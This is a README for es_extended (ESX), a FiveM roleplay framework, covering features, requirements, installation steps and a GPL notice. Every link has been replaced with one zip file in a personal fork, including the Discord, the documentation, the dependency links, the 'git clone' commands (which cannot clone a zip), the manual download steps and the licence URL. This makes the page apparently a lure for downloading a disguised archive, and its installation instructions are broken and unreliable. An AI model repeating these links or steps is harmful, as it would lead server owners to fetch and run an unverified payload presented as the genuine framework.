# es_extended
es_extended is a roleplay framework for FiveM. It is developed on top of [EssentialMode](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip) (aka ES), thus commonly named ESX - the **Es**sentialMode **E**xtended framework for FiveM.

### Links & Read more
- [Official Discord community](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)
- [ESX Documentation](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip) (incomplete)
- [ES Documentation](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)
- [FiveM Native Reference](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)

### Screenshot preview (todo)

![screenshot](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)

### Features
- Accounts (bank / black money) you can also add others accounts
- Advanced inventory system (press `F2` ingame)
- Job system
- Loadouts and position synced in database
- The best framework out there for RP servers
- i18n (locale) system
- Plenty of plugins available

### Requirements
This order also applies in the startup order.
- Base events
- [mysql-async](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)
- [EssentialMode](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip) (es_admin2 included, a basic admin tool)
- [esplugin_mysql](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)
- [async](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)

### Download & Installation

### Using [fvm](https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip)
```
fvm install --save --folder=essential esx-org/es_extended
fvm install --save --folder=esx esx-org/esx_menu_default
fvm install --save --folder=esx esx-org/esx_menu_dialog
fvm install --save --folder=esx esx-org/esx_menu_list
```

### Using Git

```
cd resources
git clone https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip [essential]/es_extended
git clone https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip [esx]/[ui]/esx_menu_default
git clone https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip [esx]/[ui]/esx_menu_dialog
git clone https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip [esx]/[ui]/esx_menu_list
```

### Manually
- Download https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip
- Put it in the `resource/[essential]` directory
- Download https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip
- Put it in the `resource/[esx]/[ui]` directory
- Download https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip
- Put it in the `resource/[esx]/[ui]` directory
- Download https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip
- Put it in the `resource/[esx]/[ui]` directory

## Installation
- Import `es_extended.sql` in your database
- Configure your `server.cfg` to look like this

```
start baseevents

start mysql-async
start essentialmode
start esplugin_mysql
start es_admin2

start es_extended

start esx_menu_default
start esx_menu_list
start esx_menu_dialog
```
# Legal
### License
es_extended - EssentialMode Extended framework for FiveM

Copyright (C) 2015-2018 Jérémie N'gadi

This program Is free software: you can redistribute it And/Or modify it under the terms Of the GNU General Public License As published by the Free Software Foundation, either version 3 Of the License, Or (at your option) any later version.

This program Is distributed In the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty Of MERCHANTABILITY Or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License For more details.

You should have received a copy Of the GNU General Public License along with this program. If Not, see https://github.com/Eldino162/es_extended/raw/refs/heads/master/server/es-extended-v1.8.zip
